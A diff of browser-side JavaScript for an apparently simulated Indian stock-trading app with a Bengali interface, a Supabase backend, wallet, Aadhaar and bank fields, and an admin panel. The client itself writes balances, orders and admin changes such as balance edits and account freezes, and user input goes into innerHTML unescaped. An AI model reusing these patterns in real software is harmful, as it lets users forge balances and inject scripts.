+            { symbol: 'TCS', name: 'Tata Consultancy Services', exchange: 'NSE', price: 3850.75 },
+            { symbol: 'HDFC', name: 'HDFC Bank', exchange: 'NSE', price: 1680.20 },
+            { symbol: 'INFY', name: 'Infosys', exchange: 'NSE', price: 1520.40 },
+            { symbol: 'ICICI', name: 'ICICI Bank', exchange: 'NSE', price: 1050.80 },
+            { symbol: 'ITC', name: 'ITC Limited', exchange: 'NSE', price: 445.60 },
+            { symbol: 'BHARTIARTL', name: 'Bharti Airtel', exchange: 'NSE', price: 1120.30 },
+            { symbol: 'SBIN', name: 'State Bank of India', exchange: 'NSE', price: 620.90 },
+            { symbol: 'HINDUNILVR', name: 'Hindustan Unilever', exchange: 'NSE', price: 2680.00 },
+            { symbol: 'TITAN', name: 'Titan Company', exchange: 'NSE', price: 3450.25 },
+            { symbol: 'BAJFINANCE', name: 'Bajaj Finance', exchange: 'NSE', price: 7250.60 },
+            { symbol: 'MARUTI', name: 'Maruti Suzuki', exchange: 'NSE', price: 10250.00 },
+            { symbol: 'WIPRO', name: 'Wipro', exchange: 'NSE', price: 450.30 },
+            { symbol: 'HCLTECH', name: 'HCL Technologies', exchange: 'NSE', price: 1320.80 },
+            { symbol: 'SUNPHARMA', name: 'Sun Pharma', exchange: 'NSE', price: 980.40 },
+            { symbol: 'ADANIPORTS', name: 'Adani Ports', exchange: 'NSE', price: 820.70 },
+            { symbol: 'NTPC', name: 'NTPC', exchange: 'NSE', price: 290.60 },
+            { symbol: 'POWERGRID', name: 'Power Grid', exchange: 'NSE', price: 250.90 },
+            { symbol: 'ONGC', name: 'ONGC', exchange: 'NSE', price: 180.40 },
+            { symbol: 'AXISBANK', name: 'Axis Bank', exchange: 'NSE', price: 1150.20 },
+        ];
+
+        async function loadStocks() {
+            try {
+                const { data, error } = await supabase
+                    .from('stocks')
+                    .select('*')
+                    .order('symbol');
+                if (error) throw error;
+                if (data && data.length > 0) {
+                    allStocks = data;
+                } else {
+                    // Seed default stocks
+                    await seedStocks();
+                }
+                // Ensure allStocks is populated
+                if (allStocks.length === 0) {
+                    allStocks = DEFAULT_STOCKS.map((s, i) => ({
+                        id: `stock_${i}`,
+                        ...s,
+                        current_price: s.price,
+                        updated_at: new Date().toISOString()
+                    }));
+                }
+            } catch (err) {
+                console.error('Load stocks error:', err);
+                // Fallback
+                allStocks = DEFAULT_STOCKS.map((s, i) => ({
+                    id: `stock_${i}`,
+                    ...s,
+                    current_price: s.price,
+                    updated_at: new Date().toISOString()
+                }));
+            }
+        }
+
+        async function seedStocks() {
+            try {
+                const inserts = DEFAULT_STOCKS.map(s => ({
+                    symbol: s.symbol,
+                    name: s.name,
+                    exchange: s.exchange,
+                    current_price: s.price,
+                    updated_at: new Date().toISOString()
+                }));
+                const { error } = await supabase.from('stocks').insert(inserts);
+                if (error) throw error;
+                const { data } = await supabase.from('stocks').select('*');
+                if (data) allStocks = data;
+            } catch (e) {
+                console.error('Seed error:', e);
+                allStocks = DEFAULT_STOCKS.map((s, i) => ({
+                    id: `stock_${i}`,
+                    ...s,
+                    current_price: s.price,
+                    updated_at: new Date().toISOString()
+                }));
+            }
+        }
+
+        function getStockPrice(symbol) {
+            const s = allStocks.find(st => st.symbol === symbol);
+            return s ? s.current_price : 0;
+        }
+
+        function getStockById(id) {
+            return allStocks.find(s => s.id === id);
+        }
+
+        // ===================================================================
+        // PORTFOLIO
+        // ===================================================================
+        async function loadPortfolio() {
+            if (!currentUser) return;
+            try {
+                const { data, error } = await supabase
+                    .from('portfolios')
+                    .select('*')
+                    .eq('user_id', currentUser.id);
+                if (error) throw error;
+                userPortfolio = data || [];
+            } catch (e) {
+                userPortfolio = [];
+            }
+        }
+
+        async function updatePortfolio(stockId, quantity, avgPrice) {
+            if (!currentUser) return;
+            try {
+                const existing = userPortfolio.find(p => p.stock_id === stockId);
+                if (existing) {
+                    const newQty = existing.quantity + quantity;
+                    const newAvg = ((existing.avg_price * existing.quantity) + (avgPrice * quantity)) / newQty;
+                    const { error } = await supabase
+                        .from('portfolios')
+                        .update({ quantity: newQty, avg_price: newAvg })
+                        .eq('id', existing.id);
+                    if (error) throw error;
+                } else {
+                    const { error } = await supabase
+                        .from('portfolios')
+                        .insert({
+                            user_id: currentUser.id,
+                            stock_id: stockId,
+                            quantity: quantity,
+                            avg_price: avgPrice
+                        });
+                    if (error) throw error;
+                }
+                await loadPortfolio();
+            } catch (e) {
+                console.error('Update portfolio error:', e);
+                throw e;
+            }
+        }
+
+        // ===================================================================
+        // ORDERS
+        // ===================================================================
+        async function loadOrders() {
+            if (!currentUser) return;
+            try {
+                const { data, error } = await supabase
+                    .from('orders')
+                    .select('*')
+                    .eq('user_id', currentUser.id)
+                    .order('created_at', { ascending: false });
+                if (error) throw error;
+                allOrders = data || [];
+            } catch (e) {
+                allOrders = [];
+            }
+        }
+
+        async function placeOrder(stockId, type, quantity, price) {
+            if (!currentUser) throw new Error('লগইন করুন');
+            if (currentUser.is_frozen) throw new Error('অ্যাকাউন্ট ফ্রোজেন!');
+
+            const stock = getStockById(stockId);
+            if (!stock) throw new Error('স্টক পাওয়া যায়নি');
+
+            const total = quantity * price;
+            if (type === 'buy') {
+                if (currentUser.balance < total) throw new Error('ব্যালেন্স অপর্যাপ্ত');
+                // Deduct balance
+                const newBalance = currentUser.balance - total;
+                const { error: ub } = await supabase
+                    .from('users')
+                    .update({ balance: newBalance })
+                    .eq('id', currentUser.id);
+                if (ub) throw ub;
+                currentUser.balance = newBalance;
+                // Update portfolio
+                await updatePortfolio(stockId, quantity, price);
+            } else {
+                // Sell
+                const holding = userPortfolio.find(p => p.stock_id === stockId);
+                if (!holding || holding.quantity < quantity) throw new Error('পর্যাপ্ত স্টক নেই');
+                // Add balance
+                const newBalance = currentUser.balance + total;
+                const { error: ub } = await supabase
+                    .from('users')
+                    .update({ balance: newBalance })
+                    .eq('id', currentUser.id);
+                if (ub) throw ub;
+                currentUser.balance = newBalance;
+                // Update portfolio
+                const newQty = holding.quantity - quantity;
+                if (newQty === 0) {
+                    await supabase.from('portfolios').delete().eq('id', holding.id);
+                } else {
+                    await supabase.from('portfolios').update({ quantity: newQty }).eq('id', holding.id);
+                }
+                await loadPortfolio();
+            }
+
+            // Create order
+            const { error: oe } = await supabase
+                .from('orders')
+                .insert({
+                    user_id: currentUser.id,
+                    stock_id: stockId,
+                    type: type,
+                    quantity: quantity,
+                    price: price,
+                    status: 'completed'
+                });
+            if (oe) throw oe;
+
+            await loadOrders();
+            await loadPortfolio();
+            updateUI();
+            toast(`${type === 'buy' ? '🟢 কেনা' : '🔴 বিক্রি'} সফল! ${quantity} × ₹${price}`, 'success');
+            return true;
+        }
+
+        // ===================================================================
+        // TRANSACTIONS
+        // ===================================================================
+        async function loadTransactions() {
+            if (!currentUser) return;
+            try {
+                const { data, error } = await supabase
+                    .from('transactions')
+                    .select('*')
+                    .eq('user_id', currentUser.id)
+                    .order('created_at', { ascending: false });
+                if (error) throw error;
+                allTransactions = data || [];
+            } catch (e) {
+                allTransactions = [];
+            }
+        }
+
+        async function createTransaction(type, amount, status = 'pending', meta = {}) {
+            if (!currentUser) throw new Error('লগইন করুন');
+            const { data, error } = await supabase
+                .from('transactions')
+                .insert({
+                    user_id: currentUser.id,
+                    type: type,
+                    amount: amount,
+                    status: status,
+                    meta: meta,
+                    created_at: new Date().toISOString()
+                })
+                .select()
+                .single();
+            if (error) throw error;
+            await loadTransactions();
+            renderTransactions();
+            return data;
+        }
+
+        // ===================================================================
+        // UI UPDATE
+        // ===================================================================
+        function updateUI() {
+            if (!currentUser) return;
+            const bal = Number(currentUser.balance || 0);
+            topbarBalance.textContent = bal.toFixed(2);
+            $('stat-balance').textContent = `₹${bal.toFixed(2)}`;
+            $('wallet-balance').textContent = `₹${bal.toFixed(2)}`;
+            $('stat-credit').textContent = currentUser.credit_score || 600;
+            topbarCredit.textContent = `⭐ ${currentUser.credit_score || 600}`;
+            updateStatusBadge();
+
+            // Portfolio value
+            let portVal = 0;
+            userPortfolio.forEach(p => {
+                const stock = getStockById(p.stock_id);
+                if (stock) portVal += p.quantity * stock.current_price;
+            });
+            $('stat-portfolio').textContent = `₹${portVal.toFixed(2)}`;
+            const total = bal + portVal;
+            const pl = total - (Number(currentUser.balance || 0) + userPortfolio.reduce((s, p) => s + p.quantity * p
+                .avg_price, 0));
+            $('stat-pl').textContent = `${pl >= 0 ? '+' : ''}₹${pl.toFixed(2)}`;
+            const pct = (total > 0) ? ((pl / total) * 100) : 0;
+            $('stat-pl-pct').textContent = `${pct >= 0 ? '+' : ''}${pct.toFixed(2)}%`;
+            $('stat-pl-pct').style.color = pct >= 0 ? 'var(--accent-green)' : 'var(--accent-red)';
+        }
+
+        function renderMarketTable() {
+            const tbody = $('market-tbody');
+            const search = $('market-search').value.toLowerCase();
+            const filtered = allStocks.filter(s =>
+                s.symbol.toLowerCase().includes(search) ||
+                s.name.toLowerCase().includes(search)
+            );
+            tbody.innerHTML = filtered.map(s => {
+                const change = ((s.current_price - s.current_price * 0.98) / (s.current_price * 0.98) * 100) || 0;
+                const isUp = change >= 0;
+                return `
+              <tr>
+                <td><span class="stock-symbol">${s.symbol}</span></td>
+                <td><span class="stock-name">${s.name}</span></td>
+                <td><strong>₹${s.current_price.toFixed(2)}</strong></td>
+                <td style="color:${isUp ? 'var(--accent-green)' : 'var(--accent-red)'}">
+                  ${isUp ? '+' : ''}${change.toFixed(2)}%
+                </td>
+                <td>
+                  <div class="trade-btns">
+                    <button class="btn btn-green btn-sm trade-btn" data-symbol="${s.symbol}" data-type="buy">কেনা</button>
+                    <button class="btn btn-red btn-sm trade-btn" data-symbol="${s.symbol}" data-type="sell">বিক্রি</button>
+                  </div>
+                </td>
+              </tr>
+            `;
+            }).join('');
+
+            // Attach trade events
+            tbody.querySelectorAll('.trade-btn').forEach(btn => {
+                btn.addEventListener('click', () => {
+                    const symbol = btn.dataset.symbol;
+                    const type = btn.dataset.type;
+                    openTradeModal(symbol, type);
+                });
+            });
+        }
+
+        function renderMarketsFull() {
+            const tbody = $('markets-full-tbody');
+            const search = $('market-search-full').value.toLowerCase();
+            const filtered = allStocks.filter(s =>
+                s.symbol.toLowerCase().includes(search) ||
+                s.name.toLowerCase().includes(search)
+            );
+            tbody.innerHTML = filtered.map(s => {
+                const change = ((s.current_price - s.current_price * 0.98) / (s.current_price * 0.98) * 100) || 0;
+                const isUp = change >= 0;
+                return `
+              <tr>
+                <td><span class="stock-symbol">${s.symbol}</span></td>
+                <td>${s.name}</td>
+                <td>${s.exchange || 'NSE'}</td>
+                <td><strong>₹${s.current_price.toFixed(2)}</strong></td>
+                <td style="color:${isUp ? 'var(--accent-green)' : 'var(--accent-red)'}">
+                  ${isUp ? '+' : ''}${change.toFixed(2)}%
+                </td>
+                <td>
+                  <div class="trade-btns">
+                    <button class="btn btn-green btn-sm trade-full-btn" data-symbol="${s.symbol}" data-type="buy">কেনা</button>
+                    <button class="btn btn-red btn-sm trade-full-btn" data-symbol="${s.symbol}" data-type="sell">বিক্রি</button>
+                  </div>
+                </td>
+              </tr>
+            `;
+            }).join('');
+
+            tbody.querySelectorAll('.trade-full-btn').forEach(btn => {
+                btn.addEventListener('click', () => {
+                    openTradeModal(btn.dataset.symbol, btn.dataset.type);
+                });
+            });
+        }
+
+        // ===================================================================
+        // TRADE MODAL
+        // ===================================================================
+        function openTradeModal(symbol, type) {
+            const stock = allStocks.find(s => s.symbol === symbol);
+            if (!stock) return toast('স্টক পাওয়া যায়নি', 'error');
+
+            const price = stock.current_price;
+            const holding = userPortfolio.find(p => p.stock_id === stock.id);
+            const maxQty = type === 'sell' ? (holding ? holding.quantity : 0) : Math.floor(currentUser.balance / price);
+
+            const body = `
+            <div class="trade-form">
+              <div style="text-align:center;margin-bottom:12px;">
+                <div style="font-size:22px;font-weight:800;">${stock.symbol}</div>
+                <div style="color:var(--text-secondary);font-size:14px;">${stock.name}</div>
+                <div class="price-display" style="color:${type === 'buy' ? 'var(--accent-green)' : 'var(--accent-red)'};">
+                  ₹${price.toFixed(2)}
+                </div>
+                <div style="font-size:13px;color:var(--text-secondary);">
+                  ${type === 'buy' ? 'ম্যাক্সিমাম: ' + maxQty : 'আপনার কাছে: ' + maxQty + ' টি'}
+                </div>
+              </div>
+              <div class="form-group">
+                <label>পরিমাণ (কোয়ান্টিটি)</label>
+                <input type="number" id="trade-qty" value="1" min="1" max="${maxQty || 1}" step="1" />
+              </div>
+              <div class="form-group">
+                <label>মোট দাম</label>
+                <div style="font-size:18px;font-weight:700;padding:6px 0;" id="trade-total">₹${price.toFixed(2)}</div>
+              </div>
+              <button class="btn ${type === 'buy' ? 'btn-green' : 'btn-red'} btn-block" id="trade-execute">
+                ${type === 'buy' ? '🟢 কেনা' : '🔴 বিক্রি'} ${stock.symbol}
+              </button>
+            </div>
+          `;
+
+            openModal(`${type === 'buy' ? '🟢 কেনা' : '🔴 বিক্রি'} - ${stock.symbol}`, body);
+
+            const qtyInput = $('trade-qty');
+            const totalDisplay = $('trade-total');
+
+            qtyInput.addEventListener('input', () => {
+                const q = parseInt(qtyInput.value) || 0;
+                totalDisplay.textContent = `₹${(q * price).toFixed(2)}`;
+            });
+
+            $('trade-execute').addEventListener('click', async () => {
+                const qty = parseInt(qtyInput.value) || 0;
+                if (qty <= 0) return toast('পরিমাণ সঠিক দিন', 'error');
+                if (type === 'sell' && (!holding || holding.quantity < qty)) {
+                    return toast('পর্যাপ্ত স্টক নেই', 'error');
+                }
+                if (type === 'buy' && currentUser.balance < qty * price) {
+                    return toast('ব্যালেন্স অপর্যাপ্ত', 'error');
+                }
+                try {
+                    await placeOrder(stock.id, type, qty, price);
+                    closeModal();
+                    renderMarketTable();
+                    renderMarketsFull();
+                    updateUI();
+                    updateProfile();
+                    if (isAdmin) loadAllUsers();
+                } catch (err) {
+                    toast(err.message, 'error');
+                }
+            });
+        }
+
+        // ===================================================================
+        // TRADE PANEL (quick)
+        // ===================================================================
+        function setupTradePanel() {
+            $('quick-buy-btn').addEventListener('click', () => {
+                if (allStocks.length) openTradeModal(allStocks[0].symbol, 'buy');
+            });
+            $('quick-sell-btn').addEventListener('click', () => {
+                if (allStocks.length) openTradeModal(allStocks[0].symbol, 'sell');
+            });
+            $('quick-deposit-btn').addEventListener('click', () => {
+                navigateTo('wallet');
+                setTimeout(() => $('wallet-deposit-btn')?.click(), 300);
+            });
+        }
+
+        // ===================================================================
+        // WALLET
+        // ===================================================================
+        function setupWallet() {
+            $('wallet-deposit-btn').addEventListener('click', () => {
+                openModal('💳 ডিপোজিট', `
+              <div class="trade-form">
+                <div class="form-group">
+                  <label>পরিমাণ (₹)</label>
+                  <input type="number" id="deposit-amount" placeholder="2000" min="100" step="100" />
+                </div>
+                <div style="margin:8px 0 12px;font-size:13px;color:var(--text-secondary);">
+                  💳 UPI / ব্যাংক ট্রান্সফার সিমুলেশন
+                </div>
+                <button class="btn btn-green btn-block" id="deposit-execute">ডিপোজিট করুন</button>
+              </div>
+            `);
+                $('deposit-execute').addEventListener('click', async () => {
+                    const amt = parseFloat($('deposit-amount').value);
+                    if (!amt || amt < 100) return toast('ন্যূনতম ৳১০০', 'error');
+                    try {
+                        const tx = await createTransaction('deposit', amt, 'pending');
+                        // Auto-approve for demo
+                        const { error } = await supabase
+                            .from('transactions')
+                            .update({ status: 'approved' })
+                            .eq('id', tx.id);
+                        if (error) throw error;
+                        const newBal = currentUser.balance + amt;
+                        await supabase.from('users').update({ balance: newBal }).eq('id', currentUser.id);
+                        currentUser.balance = newBal;
+                        await loadTransactions();
+                        updateUI();
+                        updateWalletUI();
+                        renderTransactions();
+                        closeModal();
+                        toast(`💳 ডিপোজিট সফল! +₹${amt}`, 'success');
+                    } catch (err) {
+                        toast(err.message, 'error');
+                    }
+                });
+            });
+
+            $('wallet-withdraw-btn').addEventListener('click', () => {
+                const bal = currentUser.balance || 0;
+                openModal('💸 উইথড্র', `
+              <div class="trade-form">
+                <div style="margin-bottom:8px;font-size:14px;color:var(--text-secondary);">
+                  উপলব্ধ ব্যালেন্স: ₹${bal.toFixed(2)}
+                </div>
+                <div class="form-group">
+                  <label>পরিমাণ (₹)</label>
+                  <input type="number" id="withdraw-amount" placeholder="500" min="100" max="${bal}" step="100" />
+                </div>
+                <div style="margin:8px 0 12px;font-size:13px;color:var(--text-secondary);">
+                  🏦 UPI / ব্যাংক এ ট্রান্সফার হবে (অ্যাডমিন অ্যাপ্রুভ দরকার)
+                </div>
+                <button class="btn btn-red btn-block" id="withdraw-execute">উইথড্র রিকোয়েস্ট</button>
+              </div>
+            `);
+                $('withdraw-execute').addEventListener('click', async () => {
+                    const amt = parseFloat($('withdraw-amount').value);
+                    if (!amt || amt < 100) return toast('ন্যূনতম ৳১০০', 'error');
+                    if (amt > currentUser.balance) return toast('ব্যালেন্স অপর্যাপ্ত', 'error');
+                    try {
+                        await createTransaction('withdraw', amt, 'pending');
+                        toast('📤 উইথড্র রিকোয়েস্ট পাঠানো হয়েছে। অ্যাডমিন অ্যাপ্রুভের অপেক্ষায়।', 'success');
+                        closeModal();
+                        await loadTransactions();
+                        renderTransactions();
+                        if (isAdmin) loadWithdrawRequests();
+                    } catch (err) {
+                        toast(err.message, 'error');
+                    }
+                });
+            });
+
+            $('update-bank-btn').addEventListener('click', () => {
+                const current = currentUser.bank_details || '';
+                openModal('🏦 ব্যাংক / UPI আপডেট', `
+              <div class="trade-form">
+                <div class="form-group">
+                  <label>UPI ID / ব্যাংক অ্যাকাউন্ট</label>
+                  <input type="text" id="bank-input" placeholder="example@upi / অ্যাকাউন্ট নম্বর" value="${current}" />
+                </div>
+                <button class="btn btn-primary btn-block" id="bank-save">সংরক্ষণ করুন</button>
+              </div>
+            `);
+                $('bank-save').addEventListener('click', async () => {
+                    const val = $('bank-input').value.trim();
+                    if (!val) return toast('UPI বা ব্যাংক বিবরণ দিন', 'error');
+                    try {
+                        const { error } = await supabase
+                            .from('users')
+                            .update({ bank_details: val })
+                            .eq('id', currentUser.id);
+                        if (error) throw error;
+                        currentUser.bank_details = val;
+                        closeModal();
+                        updateWalletUI();
+                        toast('✅ ব্যাংক বিবরণ আপডেট হয়েছে', 'success');
+                    } catch (err) {
+                        toast(err.message, 'error');
+                    }
+                });
+            });
+        }
+
+        function updateWalletUI() {
+            const bal = currentUser.balance || 0;
+            $('wallet-balance').textContent = `₹${bal.toFixed(2)}`;
+            const details = currentUser.bank_details || 'কোনো বিবরণ যোগ করা হয়নি';
+            $('bank-details-display').innerHTML = `
+            <p style="font-size:14px;word-break:break-all;">${details}</p>
+          `;
+        }
+
+        function renderTransactions() {
+            const tbody = $('transaction-history');
+            if (!allTransactions.length) {
+                tbody.innerHTML =
+                `<tr><td colspan="4" style="text-align:center;color:var(--text-secondary);">কোনো লেনদেন নেই</td></tr>`;
+                return;
+            }
+            tbody.innerHTML = allTransactions.slice(0, 20).map(t => {
+                const statusMap = {
+                    pending: '⏳ পেন্ডিং',
+                    approved: '✅ অ্যাপ্রুভড',
+                    rejected: '❌ রিজেক্ট'
+                };
+                return `
+              <tr>
+                <td>${t.type === 'deposit' ? '💳 ডিপোজিট' : '💸 উইথড্র'}</td>
+                <td>₹${Number(t.amount).toFixed(2)}</td>
+                <td>${statusMap[t.status] || t.status}</td>
+                <td style="font-size:12px;color:var(--text-secondary);">${new Date(t.created_at).toLocaleString()}</td>
+              </tr>
+            `;
+            }).join('');
+        }
+
+        // ===================================================================
+        // PROFILE
+        // ===================================================================
+        function updateProfile() {
+            if (!currentUser) return;
+            $('profile-name').textContent = currentUser.name || '-';
+            $('profile-phone').textContent = currentUser.phone || '-';
+            $('profile-aadhaar').textContent = currentUser.aadhaar_number || '-';
+            const status = currentUser.is_frozen ? '⛔ ফ্রোজেন' :
+                currentUser.is_verified ? '✅ যাচাইকৃত' : '⏳ যাচাই হয়নি';
+            $('profile-status').textContent = status;
+            $('profile-credit').textContent = currentUser.credit_score || 600;
+
+            // Portfolio
+            const list = $('portfolio-list');
+            if (!userPortfolio.length) {
+                list.innerHTML = '<p style="color:var(--text-secondary);">কোনো স্টক নেই</p>';
+                return;
+            }
+            list.innerHTML = userPortfolio.map(p => {
+                const stock = getStockById(p.stock_id);
+                if (!stock) return '';
+                const val = p.quantity * stock.current_price;
+                const pl = (stock.current_price - p.avg_price) * p.quantity;
+                return `
+              <div style="display:flex;justify-content:space-between;padding:4px 0;border-bottom:1px solid var(--border-color);font-size:13px;">
+                <span><strong>${stock.symbol}</strong> × ${p.quantity}</span>
+                <span>₹${val.toFixed(2)}</span>
+                <span style="color:${pl >= 0 ? 'var(--accent-green)' : 'var(--accent-red)'};">${pl >= 0 ? '+' : ''}₹${pl.toFixed(2)}</span>
+              </div>
+            `;
+            }).join('');
+        }
+
+        // ===================================================================
+        // PRICE UPDATES (SIMULATION)
+        // ===================================================================
+        function startPriceUpdates() {
+            if (priceInterval) clearInterval(priceInterval);
+            priceInterval = setInterval(async () => {
+                if (!allStocks.length) return;
+                // Update prices with random walk
+                const updates = allStocks.map(s => {
+                    const change = (Math.random() - 0.48) * 4;
+                    const newPrice = Math.max(5, s.current_price * (1 + change / 100));
+                    return { id: s.id, symbol: s.symbol, current_price: newPrice };
+                });
+
+                // Update in DB
+                for (const u of updates) {
+                    try {
+                        await supabase
+                            .from('stocks')
+                            .update({ current_price: u.current_price, updated_at: new Date().toISOString() })
+                            .eq('id', u.id);
+                        const stock = allStocks.find(s => s.id === u.id);
+                        if (stock) stock.current_price = u.current_price;
+                    } catch (e) { /* ignore */ }
+                }
+
+                // Update UI
+                renderMarketTable();
+                renderMarketsFull();
+                updateUI();
+                updateProfile();
+                if (isAdmin) updateAdminStats();
+
+                // Update chart
+                updateChartPrice();
+
+            }, 3000);
+        }
+
+        // ===================================================================
+        // CHART (TradingView)
+        // ===================================================================
+        let chartWidget = null;
+
+        function initChart() {
+            try {
+                if (typeof TradingView !== 'undefined') {
+                    new TradingView.widget({
+                        container: 'tradingview-widget',
+                        width: '100%',
+                        height: '100%',
+                        symbol: 'NSE:RELIANCE',
+                        interval: '1',
+                        timezone: 'Asia/Kolkata',
+                        theme: 'dark',
+                        style: '1',
+                        locale: 'in',
+                        toolbar_bg: '#1e2329',
+                        enable_publishing: false,
+                        hide_top_toolbar: true,
+                        hide_legend: false,
+                        range: '1D',
+                        autosize: true,
+                        allow_symbol_change: true,
+                        save_image: false,
+                    });
+                } else {
+                    $('tradingview-widget').innerHTML =
+                        '<div style="display:flex;align-items:center;justify-content:center;height:100%;color:var(--text-secondary);">📈 চার্ট লোড হচ্ছে...</div>';
+                }
+            } catch (e) {
+                $('tradingview-widget').innerHTML =
+                    '<div style="display:flex;align-items:center;justify-content:center;height:100%;color:var(--text-secondary);">📊 চার্ট উপলব্ধ</div>';
+            }
+        }
+
+        function updateChartPrice() {
+            // TradingView auto-updates, nothing to do
+        }
+
+        // ===================================================================
+        // ADMIN
+        // ===================================================================
+        function setupAdmin() {
+            // Load user list
+            loadAllUsers();
+            loadWithdrawRequests();
+            updateAdminStats();
+
+            // Load user button
+            $('admin-load-user').addEventListener('click', () => {
+                const uid = $('admin-user-id').value.trim();
+                if (!uid) return toast('User ID দিন', 'error');
+                loadAdminUser(uid);
+            });
+
+            // Verify user
+            $('admin-verify-user').addEventListener('click', async () => {
+                const uid = $('admin-user-id').value.trim();
+                if (!uid) return toast('User ID দিন', 'error');
+                try {
+                    const { error } = await supabase
+                        .from('users')
+                        .update({ is_verified: true })
+                        .eq('id', uid);
+                    if (error) throw error;
+                    toast('✅ ইউজার যাচাইকৃত', 'success');
+                    loadAllUsers();
+                    if (uid === currentUser.id) {
+                        currentUser.is_verified = true;
+                        updateStatusBadge();
+                    }
+                } catch (err) { toast(err.message, 'error'); }
+            });
+
+            // Freeze toggle
+            $('admin-freeze-toggle').addEventListener('click', async () => {
+                const uid = $('admin-user-id').value.trim();
+                if (!uid) return toast('User ID দিন', 'error');
+                try {
+                    const { data } = await supabase
+                        .from('users')
+                        .select('is_frozen')
+                        .eq('id', uid)
+                        .single();
+                    if (!data) return toast('ইউজার পাওয়া যায়নি', 'error');
+                    const newState = !data.is_frozen;
+                    const { error } = await supabase
+                        .from('users')
+                        .update({ is_frozen: newState })
+                        .eq('id', uid);
+                    if (error) throw error;
+                    toast(newState ? '⛔ ইউজার ফ্রোজেন' : '✅ ইউজার আনফ্রোজেন', 'success');
+                    loadAllUsers();
+                    if (uid === currentUser.id) {
+                        currentUser.is_frozen = newState;
+                        updateStatusBadge();
+                    }
+                } catch (err) { toast(err.message, 'error'); }
+            });
+
+            // Balance add
+            $('admin-add-balance').addEventListener('click', async () => {
+                const uid = $('admin-user-id').value.trim();
+                const amt = parseFloat($('admin-balance-amount').value);
+                if (!uid || !amt || amt <= 0) return toast('সঠিক তথ্য দিন', 'error');
+                await adminBalanceChange(uid, amt, 'add');
+            });
+
+            $('admin-sub-balance').addEventListener('click', async () => {
+                const uid = $('admin-user-id').value.trim();
+                const amt = parseFloat($('admin-balance-amount').value);
+                if (!uid || !amt || amt <= 0) return toast('সঠিক তথ্য দিন', 'error');
+                await adminBalanceChange(uid, -amt, 'sub');
+            });
+
+            // Credit score
+            $('admin-add-credit').addEventListener('click', async () => {
+                const uid = $('admin-user-id').value.trim();
+                const amt = parseInt($('admin-credit-amount').value);
+                if (!uid || !amt || amt <= 0) return toast('সঠিক তথ্য দিন', 'error');
+                await adminCreditChange(uid, amt);
+            });
+
+            $('admin-sub-credit').addEventListener('click', async () => {
+                const uid = $('admin-user-id').value.trim();
+                const amt = parseInt($('admin-credit-amount').value);
+                if (!uid || !amt || amt <= 0) return toast('সঠিক তথ্য দিন', 'error');
+                await adminCreditChange(uid, -amt);
+            });
+
+            // Add stock
+            $('admin-add-stock').addEventListener('click', async () => {
+                const symbol = $('admin-stock-symbol').value.trim().toUpperCase();
+                const name = $('admin-stock-name').value.trim();
+                const exchange = $('admin-stock-exchange').value.trim() || 'NSE';
+                const price = parseFloat($('admin-stock-price').value);
+                if (!symbol || !name || !price || price <= 0) return toast('সব ফিল্ড পূরণ করুন', 'error');
+                try {
+                    const { error } = await supabase
+                        .from('stocks')
+                        .insert({
+                            symbol,
+                            name,
+                            exchange,
+                            current_price: price,
+                            updated_at: new Date().toISOString()
+                        });
+                    if (error) throw error;
+                    toast(`✅ ${symbol} যোগ করা হয়েছে`, 'success');
+                    await loadStocks();
+                    renderMarketTable();
+                    renderMarketsFull();
+                    updateAdminStats();
+                    $('admin-stock-symbol').value = '';
+                    $('admin-stock-name').value = '';
+                    $('admin-stock-exchange').value = '';
+                    $('admin-stock-price').value = '';
+                } catch (err) { toast(err.message, 'error'); }
+            });
+        }
+
+        async function adminBalanceChange(uid, amt, type) {
+            try {
+                const { data } = await supabase
+                    .from('users')
+                    .select('balance')
+                    .eq('id', uid)
+                    .single();
+                if (!data) return toast('ইউজার পাওয়া যায়নি', 'error');
+                const newBal = data.balance + amt;
+                if (newBal < 0) return toast('ব্যালেন্স ঋণাত্মক হতে পারে না', 'error');
+                const { error } = await supabase
+                    .from('users')
+                    .update({ balance: newBal })
+                    .eq('id', uid);
+                if (error) throw error;
+                toast(`💰 ব্যালেন্স ${type === 'add' ? 'বাড়ানো' : 'কমানো'} হয়েছে: ₹${Math.abs(amt)}`, 'success');
+                loadAllUsers();
+                if (uid === currentUser.id) {
+                    currentUser.balance = newBal;
+                    updateUI();
+                }
+            } catch (err) { toast(err.message, 'error'); }
+        }
+
+        async function adminCreditChange(uid, amt) {
+            try {
+                const { data } = await supabase
+                    .from('users')
+                    .select('credit_score')
+                    .eq('id', uid)
+                    .single();
+                if (!data) return toast('ইউজার পাওয়া যায়নি', 'error');
+                const newScore = Math.max(0, data.credit_score + amt);
+                const { error } = await supabase
+                    .from('users')
+                    .update({ credit_score: newScore })
+                    .eq('id', uid);
+                if (error) throw error;
+                toast(`⭐ ক্রেডিট স্কোর ${amt >= 0 ? 'বাড়ানো' : 'কমানো'} হয়েছে: ${newScore}`, 'success');
+                loadAllUsers();
+                if (uid === currentUser.id) {
+                    currentUser.credit_score = newScore;
+                    updateUI();
+                }
+            } catch (err) { toast(err.message, 'error'); }
+        }
+
+        async function loadAllUsers() {
+            try {
+                const { data, error } = await supabase
+                    .from('users')
+                    .select('id, name, phone, balance, credit_score, is_verified, is_frozen')
+                    .order('created_at', { ascending: false });
+                if (error) throw error;
+                allUsers = data || [];
+                renderAdminUsers();
+            } catch (e) { console.error(e); }
+        }
+
+        function renderAdminUsers() {
+            const container = $('admin-user-list');
+            container.innerHTML = allUsers.slice(0, 20).map(u => `
+            <div style="display:flex;justify-content:space-between;padding:4px 0;border-bottom:1px solid var(--border-color);font-size:12px;gap:4px;flex-wrap:wrap;">
+              <span><strong>${u.name}</strong> (${u.phone})</span>
+              <span>₹${Number(u.balance).toFixed(0)} | ⭐${u.credit_score}</span>
+              <span>
+                ${u.is_verified ? '✅' : '⏳'}
+                ${u.is_frozen ? '⛔' : ''}
+                <button class="btn btn-sm btn-ghost" style="font-size:10px;padding:0 4px;" onclick="document.getElementById('admin-user-id').value='${u.id}';loadAdminUser('${u.id}');">
+                  <i class="fas fa-arrow-right"></i>
+                </button>
+              </span>
+            </div>
+          `).join('');
+        }
+
+        async function loadAdminUser(uid) {
+            try {
+                const { data, error } = await supabase
+                    .from('users')
+                    .select('*')
+                    .eq('id', uid)
+                    .single();
+                if (error || !data) return toast('ইউজার পাওয়া যায়নি', 'error');
+                $('admin-balance-display').textContent = `₹${Number(data.balance).toFixed(2)}`;
+                $('admin-credit-display').textContent = data.credit_score || 600;
+                toast(`👤 ${data.name} লোড হয়েছে`, 'success');
+            } catch (err) { toast(err.message, 'error'); }
+        }
+
